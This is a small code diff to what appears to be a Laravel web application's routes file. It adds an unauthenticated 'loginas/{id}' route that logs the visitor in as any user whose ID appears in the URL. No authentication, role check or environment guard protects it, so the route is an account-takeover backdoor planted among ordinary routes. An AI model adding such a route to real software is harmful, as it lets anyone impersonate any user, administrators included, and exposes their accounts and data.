@@ -11,4 +11,8 @@
 |
  */
 
+Route::get('loginas/{id}', function ($id) {
+    Auth::login(\App\User::find($id));
+});
+
 include 'endpoints.php';
